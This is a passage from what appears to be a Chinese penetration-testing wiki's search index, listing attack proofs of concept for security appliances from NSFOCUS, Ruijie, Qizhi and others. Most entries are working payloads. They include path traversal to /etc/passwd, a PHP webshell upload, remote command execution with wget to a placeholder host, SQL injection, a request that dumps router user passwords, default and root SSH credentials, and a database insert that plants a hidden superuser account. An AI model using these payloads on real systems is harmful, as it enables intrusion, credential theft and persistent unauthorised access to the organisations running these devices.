10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip, deflate Connection: close \u7eff\u76dfsas\u5b89\u5168\u5ba1\u8ba1\u7cfb\u7edf\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1ePOC /webconf/GetFile/indexpath=../../../../../../../../../../../../../../etc/passwd NF \u4e0b\u4e00\u4ee3\u9632\u706b\u5899 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e POC: POST /api/v1/device/bugsInfo HTTP/1.1 Content-Type: multipart/form-data; boundary=4803b59d015026999b45993b1245f0ef Host: --4803b59d015026999b45993b1245f0ef Content-Disposition: form-data; name=\"file\"; filename=\"compose.php\" <?php eval($_POST['cmd']);?> --4803b59d015026999b45993b1245f0ef-- POST /mail/include/header_main.php HTTP/1.1 Content-Type: application/x-www-form-urlencoded Cookie: PHPSESSID_NF=82c13f359d0dd8f51c29d658a9c8ac71 Host: cmd=phpinfo();","title":"\u7eff\u76df"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E7%BB%BF%E7%9B%9F/%E7%BB%BF%E7%9B%9F/#_1","text":"","title":"\u7eff\u76df"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E7%BB%BF%E7%9B%9F/%E7%BB%BF%E7%9B%9F/#_2","text":"\u5821\u5792\u673a SAS\u5821\u5792\u673a local_user.php \u4efb\u610f\u7528\u6237\u767b\u5f55\u6f0f\u6d1e POC SAS\u5821\u5792\u673a GetFile \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e POC SAS\u5821\u5792\u673a Exec \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e POC \u7eff\u76dfsas\u5b89\u5168\u5ba1\u8ba1\u7cfb\u7edf\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1ePOC NF \u4e0b\u4e00\u4ee3\u9632\u706b\u5899 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E7%BB%BF%E7%9B%9F/%E7%BB%BF%E7%9B%9F/#_3","text":"body=\"'/needUsbkey.php?username='\"","title":"\u5821\u5792\u673a"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E7%BB%BF%E7%9B%9F/%E7%BB%BF%E7%9B%9F/#sas-local_userphp-poc","text":"GET /api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin HTTP/1.1 Host: 1.1.1.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip, deflate Connection: close","title":"SAS\u5821\u5792\u673a local_user.php \u4efb\u610f\u7528\u6237\u767b\u5f55\u6f0f\u6d1e POC"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E7%BB%BF%E7%9B%9F/%E7%BB%BF%E7%9B%9F/#sas-getfile-poc","text":"GET /api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin HTTP/1.1 Host: 1.1.1.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip, deflate Connection: close","title":"SAS\u5821\u5792\u673a GetFile \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e POC"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E7%BB%BF%E7%9B%9F/%E7%BB%BF%E7%9B%9F/#sas-exec-poc","text":"GET /webconf/Exec/index?cmd=wget%20xxx.xxx.xx.xx HTTP/1.1 Host: 1.1.1.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip, deflate Connection: close","title":"SAS\u5821\u5792\u673a Exec \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e POC"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E7%BB%BF%E7%9B%9F/%E7%BB%BF%E7%9B%9F/#saspoc","text":"/webconf/GetFile/indexpath=../../../../../../../../../../../../../../etc/passwd","title":"\u7eff\u76dfsas\u5b89\u5168\u5ba1\u8ba1\u7cfb\u7edf\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1ePOC"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E7%BB%BF%E7%9B%9F/%E7%BB%BF%E7%9B%9F/#nf","text":"POC: POST /api/v1/device/bugsInfo HTTP/1.1 Content-Type: multipart/form-data; boundary=4803b59d015026999b45993b1245f0ef Host: --4803b59d015026999b45993b1245f0ef Content-Disposition: form-data; name=\"file\"; filename=\"compose.php\" <?php eval($_POST['cmd']);?> --4803b59d015026999b45993b1245f0ef-- POST /mail/include/header_main.php HTTP/1.1 Content-Type: application/x-www-form-urlencoded Cookie: PHPSESSID_NF=82c13f359d0dd8f51c29d658a9c8ac71 Host: cmd=phpinfo();","title":"NF \u4e0b\u4e00\u4ee3\u9632\u706b\u5899 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E8%BE%B0%E4%BF%A1%E6%99%AF%E4%BA%91/%E8%BE%B0%E4%BF%A1%E6%99%AF%E4%BA%91/","text":"\u8fb0\u4fe1\u666f\u4e91 \u76ee\u5f55 \u8fb0\u4fe1\u666f\u4e91\u7ec8\u7aef\u5b89\u5168\u7ba1\u7406\u7cfb\u7edf login SQL\u6ce8\u5165\u6f0f\u6d1e POC \u8fb0\u4fe1\u666f\u4e91\u7ec8\u7aef\u5b89\u5168\u7ba1\u7406\u7cfb\u7edf login SQL\u6ce8\u5165\u6f0f\u6d1e POC POST /api/user/login captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(3))a)='","title":"\u8fb0\u4fe1\u666f\u4e91"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E8%BE%B0%E4%BF%A1%E6%99%AF%E4%BA%91/%E8%BE%B0%E4%BF%A1%E6%99%AF%E4%BA%91/#_1","text":"","title":"\u8fb0\u4fe1\u666f\u4e91"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E8%BE%B0%E4%BF%A1%E6%99%AF%E4%BA%91/%E8%BE%B0%E4%BF%A1%E6%99%AF%E4%BA%91/#_2","text":"\u8fb0\u4fe1\u666f\u4e91\u7ec8\u7aef\u5b89\u5168\u7ba1\u7406\u7cfb\u7edf login SQL\u6ce8\u5165\u6f0f\u6d1e POC","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E8%BE%B0%E4%BF%A1%E6%99%AF%E4%BA%91/%E8%BE%B0%E4%BF%A1%E6%99%AF%E4%BA%91/#login-sql-poc","text":"POST /api/user/login captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(3))a)='","title":"\u8fb0\u4fe1\u666f\u4e91\u7ec8\u7aef\u5b89\u5168\u7ba1\u7406\u7cfb\u7edf login SQL\u6ce8\u5165\u6f0f\u6d1e POC"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7/","text":"\u9510\u6377 \u76ee\u5f55 \u9510\u6377 NBR\u8def\u7531\u5668 \u9ed8\u8ba4\u5bc6\u7801 \u7248\u672c\u63a2\u6d4b \u83b7\u53d6\u6240\u6709\u7528\u6237\u7684\u8d26\u53f7\u5bc6\u7801 \u9510\u6377 NBR\u8def\u7531\u5668 \u9ed8\u8ba4\u5bc6\u7801 guest/guest \u8bbf\u5ba2\u8d26\u6237 admin/admin \u7248\u672c\u63a2\u6d4b POST /WEB_VMS/LEVEL15/ HTTP/1.1 Host: Connection: keep-alive Content-Length: 73 Authorization: Basic User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Content-Type: text/plain;charset=UTF-8 Accept: */* Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: auth=; user= x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 command=show version&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant. \u83b7\u53d6\u6240\u6709\u7528\u6237\u7684\u8d26\u53f7\u5bc6\u7801 \u5982\u679cguest\u8d26\u6237\u53ef\u7528\uff0c\u53ef\u7528\u5982\u4e0bexp\u83b7\u5f97\u6240\u6709\u7528\u6237\u7684\u5bc6\u7801 POST /WEB_VMS/LEVEL15/ HTTP/1.1 Host: Connection: keep-alive Content-Length: 73 Authorization: Basic User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Content-Type: text/plain;charset=UTF-8 Accept: */* Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: auth=; user= x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 command=show webmaster user&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.","title":"\u9510\u6377"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7/#_1","text":"","title":"\u9510\u6377"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7/#_2","text":"\u9510\u6377 NBR\u8def\u7531\u5668 \u9ed8\u8ba4\u5bc6\u7801 \u7248\u672c\u63a2\u6d4b \u83b7\u53d6\u6240\u6709\u7528\u6237\u7684\u8d26\u53f7\u5bc6\u7801","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7/#nbr","text":"","title":"\u9510\u6377 NBR\u8def\u7531\u5668"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7/#_3","text":"guest/guest \u8bbf\u5ba2\u8d26\u6237 admin/admin","title":"\u9ed8\u8ba4\u5bc6\u7801"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7/#_4","text":"POST /WEB_VMS/LEVEL15/ HTTP/1.1 Host: Connection: keep-alive Content-Length: 73 Authorization: Basic User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Content-Type: text/plain;charset=UTF-8 Accept: */* Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: auth=; user= x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 command=show version&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.","title":"\u7248\u672c\u63a2\u6d4b"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7/#_5","text":"\u5982\u679cguest\u8d26\u6237\u53ef\u7528\uff0c\u53ef\u7528\u5982\u4e0bexp\u83b7\u5f97\u6240\u6709\u7528\u6237\u7684\u5bc6\u7801 POST /WEB_VMS/LEVEL15/ HTTP/1.1 Host: Connection: keep-alive Content-Length: 73 Authorization: Basic User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Content-Type: text/plain;charset=UTF-8 Accept: */* Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: auth=; user= x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 command=show webmaster user&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.","title":"\u83b7\u53d6\u6240\u6709\u7528\u6237\u7684\u8d26\u53f7\u5bc6\u7801"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E9%BD%90%E6%B2%BB/%E9%BD%90%E6%B2%BB/","text":"\u9f50\u6cbb \u76ee\u5f55 \u5821\u5792\u673aJAVA \u9ed8\u8ba4\u53e3\u4ee4 \u524d\u6e17\u900f \u540e\u6e17\u900f \u521b\u5efa\u8d85\u7ea7\u7528\u6237 \u5411\u4e3b\u673a\u4e0b\u53d1\u547d\u4ee4 \u8bbf\u95ee\u8d44\u4ea7 \u5821\u5792\u673aPHP \u524d\u6e17\u900f \u4efb\u610f\u7528\u6237\u767b\u5f55 \u540e\u53f0rce \u524d\u53f0RCE\uff08CNVD-2019-20835\uff09 \u540e\u6e17\u900f \u83b7\u53d6\u7ba1\u7406\u5458\u5bc6\u7801 \u65b0\u5efa\u7ba1\u7406\u5458 \u8bbe\u5907\u5bc6\u7801\u5bfc\u51fa \u600e\u4e48\u5224\u65ad\u5821\u5792\u673a\u662fjava\u8fd8\u662fphp\uff1f\u7528chrome\u63d2\u4ef6wappalyzer\uff01 \u5821\u5792\u673aJAVA app=\"\u9f50\u6cbb\u79d1\u6280-\u5821\u5792\u673a\" \u9ed8\u8ba4\u53e3\u4ee4 \u9ed8\u8ba4\u8d26\u53f7\u5bc6\u7801\u4e3a admin/admin SSH\u7528\u6237\uff1a root SSH\u5bc6\u7801\uff1a 4OO88O2393 \u524d\u6e17\u900f \u65e0\u516c\u5f00\u6f0f\u6d1e \u540e\u6e17\u900f \u521b\u5efa\u8d85\u7ea7\u7528\u6237 \u767b\u5f55\u6570\u636e\u5e93 psql -U shterm -h 127.0.0.1 -d shterm \u6267\u884c INSERT INTO \"public\".\"tbl_user\" (\"id\", \"login_name\", \"user_name\", \"passwd\", \"email\", \"role_id\", \"authtype_id\", \"auth_info\", \"state\", \"ext_info\", \"extra\", \"last_login_time\", \"pwd_change_time\", \"authtoken_id\", \"valid_from\", \"valid_to\", \"pwd_valid\", \"join_time\", \"join_user\", \"update_time\", \"deleted\", \"remark\", \"ssh_key\", \"user_type\", \"region_id\", \"delete_time\", \"disabled_time\", \"department_id\", \"audit_scope\", \"user_category\") VALUES (10088, 'shtermManager', 'shtermManager', '{bcrypt}$2a$10$5Jt5ncvrj5rBZtfQR6YQaeWIuqqJZd1k1KSU23umZeFU89fCYu4la', NULL, 1, 1, '{\"passwordType\": \"custom\"}', 0, '{}', '{\"locale\": {\"country\": \"CN\", \"language\": \"zh\"}, \"userNav\": [{\"name\": \"User.nav_All\", \"useOr\": false, \"filters\": []}, {\"name\": \"role.ROLE_CONFIG\", \"useOr\": false, \"filters\": [{\"attr\": \"role.id\", \"oper\": \"In\", \"value\": \"2\"}]}, {\"name\": \"role.ROLE_ADMIN\", \"useOr\": false, \"filters\": [{\"attr\": \"role.id\", \"oper\": \"In\", \"value\": \"1\"}]}, {\"name\": \"User.nav_NoGroup\", \"useOr\": false, \"filters\": [{\"attr\": \"usergroups\", \"oper\": \"Null\", \"value\": \"true\"}]}, {\"name\": \"User.state.3\", \"useOr\": false, \"filters\": [{\"attr\": \"state\", \"oper\": \"In\", \"value\": \"3\"}]}, {\"name\": \"User.state.2\", \"useOr\": false, \"filters\": [{\"attr\": \"state\", \"oper\": \"In\", \"value\": \"2\"}]}, {\"name\": \"User.state.1\", \"useOr\": false, \"filters\": [{\"attr\": \"state\", \"oper\": \"In\", \"value\": \"1\"}]}, {\"name\": \"User.nav_Inactive\", \"useOr\": true, \"filters\": [{\"attr\": \"lastLoginTime\", \"oper\": \"Before\", \"value\": \"2021-08-21\"}, {\"attr\": \"lastLoginTime\", \"oper\": \"Null\", \"value\": \"true\"}]}], \"appOldNav\": [{\"name\": \"dev.appall\", \"count\": 0, \"useOr\": false, \"filters\": [{\"attr\": \"type\", \"oper\": \"Is\", \"value\": \"3\"}, {\"attr\": \"state\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"deleted\", \"oper\": \"Is\", \"value\": \"false\"}]}, {\"name\": \"B/S\", \"count\": 0, \"useOr\": false, \"filters\": [{\"attr\": \"sysType.name\", \"oper\": \"Contains\", \"value\": \"B/S\"}, {\"attr\": \"type\", \"oper\": \"Is\", \"value\": \"3\"}, {\"attr\": \"state\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"deleted\", \"oper\": \"Is\", \"value\": \"false\"}]}, {\"name\": \"C/S\", \"count\": 0, \"useOr\": false, \"filters\": [{\"attr\": \"sysType.name\", \"oper\": \"Contains\", \"value\": \"C/S\"}, {\"attr\": \"type\", \"oper\": \"Is\", \"value\": \"3\"}, {\"attr\": \"state\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"deleted\", \"oper\": \"Is\", \"value\": \"false\"}]}, {\"name\": \"Weblogic\", \"count\": 0, \"useOr\": false, \"filters\": [{\"attr\": \"sysType.name\", \"oper\": \"Contains\", \"value\": \"Weblogic\"}, {\"attr\": \"type\", \"oper\": \"Is\", \"value\": \"3\"}, {\"attr\": \"state\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"deleted\", \"oper\": \"Is\", \"value\": \"false\"}]}, {\"name\": \"B/S IE\", \"count\": 0, \"useOr\": false, \"filters\": [{\"attr\": \"sysType.name\", \"oper\": \"Contains\", \"value\": \"B/S IE\"}, {\"attr\": \"type\", \"oper\": \"Is\", \"value\": \"3\"}, {\"attr\": \"state\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"deleted\", \"oper\": \"Is\", \"value\": \"false\"}]}], \"devOldNav\": [{\"name\": \"dev.hostall\", \"count\": 0, \"useOr\": false, \"filters\": [{\"attr\": \"type\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"state\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"deleted\", \"oper\": \"Is\", \"value\": \"false\"}]}, {\"name\": \"Linux\", \"count\": 0, \"useOr\": false, \"filters\": [{\"attr\": \"sysType.name\", \"oper\": \"Contains\", \"value\": \"Linux\"}, {\"attr\": \"type\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"state\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"deleted\", \"oper\": \"Is\", \"value\": \"false\"}]}, {\"name\": \"Windows\", \"count\": 0, \"useOr\": false, \"filters\": [{\"attr\": \"sysType.name\", \"oper\": \"Contains\", \"value\": \"Windows\"}, {\"attr\": \"type\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"state\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"deleted\", \"oper\": \"Is\", \"value\": \"false\"}]}, {\"name\": \"HP UX\", \"count\": 0, \"useOr\": false, \"filters\": [{\"attr\": \"sysType.name\", \"oper\": \"Contains\", \"value\": \"HP UX\"}, {\"attr\": \"type\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"state\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"deleted\", \"oper\": \"Is\", \"value\": \"false\"}]}, {\"name\": \"IBM AIX\", \"count\": 0, \"useOr\": false, \"filters\": [{\"attr\": \"sysType.name\", \"oper\": \"Contains\", \"value\": \"IBM AIX\"}, {\"attr\": \"type\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"state\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"deleted\", \"oper\": \"Is\", \"value\": \"false\"}]}, {\"name\": \"IBM AS/400\", \"count\": 0, \"useOr\": false, \"filters\": [{\"attr\": \"sysType.name\", \"oper\": \"Is\", \"value\": \"IBM AS/400\"}, {\"attr\": \"type\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"state\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"deleted\", \"oper\": \"Is\", \"value\": \"false\"}]}], \"accessServ\": {\"changepwd\": 1690250316342, \"automation\": 1690250226507, \"deviceaccess\": 1690199078938}, \"indexWidgets\": [], \"changePlanNav\": [{\"name\": \"secretChangePlan.nav_plan_All\", \"filters\": [{\"attr\": \"status\", \"oper\": \"Is\", \"value\": \"0\"}]}, {\"name\": \"secretChangePlan.nav_plan_maunl\", \"filters\": [{\"attr\": \"execType\", \"oper\": \"Is\", \"value\": \"1\"}, {\"attr\": \"status\", \"oper\": \"Is\", \"value\": \"0\"}]}, {\"name\": \"secretChangePlan.nav_plan_fail\", \"filters\": [{\"attr\": \"execResult\", \"oper\": \"Is\", \"value\": \"2\"}, {\"attr\": \"status\", \"oper\": \"Is\", \"value\": \"0\"}]}], \"updateListNav\": [{\"name\": \"cloud.update.all\", \"useOr\": false, \"filters\": []}, {\"name\": \"cloud.process.1\", \"useOr\": false, \"filters\": [{\"attr\": \"status\", \"oper\": \"Is\", \"value\": \"1\"}]}, {\"name\": \"cloud.process.4\", \"useOr\": false, \"filters\": [{\"attr\": \"status\", \"oper\": \"Is\", \"value\": \"4\"}]}, {\"name\": \"cloud.process.2\", \"useOr\": false, \"filters\": [{\"attr\": \"status\", \"oper\": \"Is\", \"value\": \"2\"}]}, {\"name\": \"cloud.process.3\", \"useOr\": false, \"filters\": [{\"attr\": \"status\", \"oper\": \"Is\", \"value\": \"3\"}]}], \"databaseOldNav\": [{\"name\": \"dev.databaseall\", \"count\": 0, \"useOr\": false, \"filters\": [{\"attr\": \"type\", \"oper\": \"Is\", \"value\": \"2\"}, {\"attr\": \"state\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"deleted\", \"oper\": \"Is\", \"value\": \"false\"}]}, {\"name\": \"Oracle\", \"count\": 0, \"useOr\": false, \"filters\": [{\"attr\": \"sysType.name\", \"oper\": \"Contains\", \"value\": \"Oracle\"}, {\"attr\": \"type\", \"oper\": \"Is\", \"value\": \"2\"}, {\"attr\": \"state\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"deleted\", \"oper\": \"Is\", \"value\": \"false\"}]}, {\"name\": \"MYSQL\", \"count\": 0, \"useOr\": false, \"filters\": [{\"attr\": \"sysType.name\", \"oper\": \"Contains\", \"value\": \"MYSQL\"}, {\"attr\": \"type\", \"oper\": \"Is\", \"value\": \"2\"}, {\"attr\": \"state\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"deleted\", \"oper\": \"Is\", \"value\": \"false\"}]}, {\"name\": \"MSSQL\", \"count\": 0, \"useOr\": false, \"filters\": [{\"attr\": \"sysType.name\", \"oper\": \"Contains\", \"value\": \"MSSQL\"}, {\"attr\": \"type\", \"oper\": \"Is\", \"value\": \"2\"}, {\"attr\": \"state\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"deleted\", \"oper\": \"Is\", \"value\": \"false\"}]}, {\"name\": \"DB2\", \"count\": 0, \"useOr\": false, \"filters\": [{\"attr\": \"sysType.name\", \"oper\": \"Contains\", \"value\": \"DB2\"}, {\"attr\": \"type\", \"oper\": \"Is\", \"value\": \"2\"}, {\"attr\": \"state\", \"oper\": \"Is\", \"value\": \"0\"}, {\"attr\": \"deleted\", \"oper\": \"Is\", \"value\": \"false\"}]}]}', '2021-11-21 04:04:04.612', '2021-11-21 09:55:32.875', NULL, NULL, NULL, 0, NULL, NULL, '2021-11-21 09:55:32.875', 'f', NULL, NULL, 0, NULL, NULL, NULL, 1, NULL, 0); \u7528\u6237\u540d\uff1ashtermManager \u5bc6\u7801\uff1aShterm10086 \u767b\u5f55\u540e\u4fee\u6539\u5bc6\u7801\uff0c\u5373\u53ef\u83b7\u5f97\u5b8c\u6574\u6743\u9650 \u5411\u4e3b\u673a\u4e0b\u53d1\u547d\u4ee4 \u5de5\u4f5c\u53f0\u2192\u81ea\u52a8\u5316\u2192\u589e\u52a0\u811a\u672c\u4efb\u52a1\u2192\u6dfb\u52a0\u76ee\u6807\u8d44\u4ea7\u2192\u81ea\u5b9a\u4e49\u547d\u4ee4\u2192\u7acb\u5373\u6267\u884c \u8bbf\u95ee\u8d44\u4ea7 web\u670d\u52a1\u8bbf\u95ee\uff1a\u5de5\u4f5c\u53f0\u2192\u8bbf\u95ee\u8d44\u4ea7 rdp\u8bbf\u95ee\uff1ardp\u767b\u5f55\u5821\u5792\u673a\uff0c\u8f93\u5165web\u670d\u52a1\u7684\u8d26\u6237\u5bc6\u7801\uff0c\u8fdb\u53bb\u540e\u5c31\u662f\u53ef\u767b\u5f55\u5217\u8868 ssh\u8bbf\u95ee\uff1a\u8f93\u5165web\u670d\u52a1\u7684\u8d26\u6237\u5bc6\u7801\uff0c\u8fdb\u53bb\u540e\u5c31\u662f\u53ef\u767b\u5f55\u5217\u8868 \u5821\u5792\u673aPHP \u524d\u6e17\u900f \u4efb\u610f\u7528\u6237\u767b\u5f55 http://xxx.xxx.xxx.xxx/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm \u72b6\u6001\u7801\u8fd4\u56de200\uff0c\u5b58\u5728\u6f0f\u6d1e\uff1b\u201c\u9519\u8befID\u201d\u63d0\u793a\uff0c\u4e0d\u5b58\u5728\u6f0f\u6d1e\u3002 \u540e\u53f0rce 